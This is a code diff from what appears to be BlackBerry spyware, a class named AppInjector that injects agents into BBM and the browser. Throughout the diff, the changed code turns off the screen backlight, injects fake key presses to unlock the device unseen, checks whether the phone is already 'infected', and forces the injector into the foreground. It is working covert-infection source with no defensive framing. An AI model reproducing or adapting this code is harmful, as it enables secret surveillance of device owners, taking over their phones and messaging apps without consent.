@@ -15,7 +15,6 @@ import net.rim.device.api.system.Backlight;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
-import blackberry.Device;
 import blackberry.agent.im.AppInjectorBBM;
 import blackberry.agent.url.AppInjectorBrowser;
 import blackberry.debug.Debug;
@@ -121,53 +120,19 @@ public class AppInjector {
 
         Utils.sleep(delegate.getDelay());
 
-        //#ifdef DEBUG
-        debug.trace("infect getHardwareLayout: " + Keypad.getHardwareLayout());
-        //#endif
-        
-        if (Device.getInstance().atLeast(5, 0)) {
+        if ( isInfected()) {
             //#ifdef DEBUG
-            debug.trace("infect media " + Keypad.hasMediaKeys());          
-            //#endif
-            if (Keypad.hasMediaKeys()) {
-                //#ifdef DEBUG
-                debug.trace("infect: KEY_SPEAKERPHONE");
-                //#endif
-                // con 9300 funziona:
-                KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
-            } else {
-                //#ifdef DEBUG
-                debug.trace("infect: KEY_LOCK");
-                //#endif
-                // con 9700 :
-                KeyInjector.pressRawKeyCode(KEY_LOCK);
-            }
-
-        } else {
-            //#ifdef DEBUG
-            debug.trace("infect: KEY_SPEAKERPHONE");
-            //#endif
-            // con 9300 funziona:
-            KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
-        }
-
-        Utils.sleep(500);
-        Backlight.enable(false);
-        Utils.sleep(delegate.getDelay());
-
-        //KeyInjector.pressRawKeyCode(Keypad.KE);
-
-        if (Backlight.isEnabled() || isInfected()) {
-            //#ifdef DEBUG
-            debug.trace("infected or backlight, bailing out");
+            debug.trace("infected, bailing out");
             //#endif
             return;
         }
 
-        //ApplicationManager.getApplicationManager().lockSystem(true);
-        //Backlight.enable(false);
+        Backlight.enable(false);
+        
+        unLock();
 
         int req = requestForeground();
+        
         Utils.sleep(200);
         boolean fore = checkForeground();
 
@@ -183,6 +148,22 @@ public class AppInjector {
             if (req == 2 && checkForeground()) {
                 manager.requestForegroundForConsole();
             }
+        }
+    }
+
+    private void unLock() {
+        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
+        Utils.sleep(200);
+        if(Backlight.isEnabled()){            
+            //#ifdef DEBUG
+            debug.trace("Backlight still enabled, getHardwareLayout: " + Keypad.getHardwareLayout());
+            //#endif
+            
+            KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
+            KeyInjector.pressRawKeyCode(KEY_LOCK);
+            Backlight.enable(false);
+            
+            return;
         }
     }
 
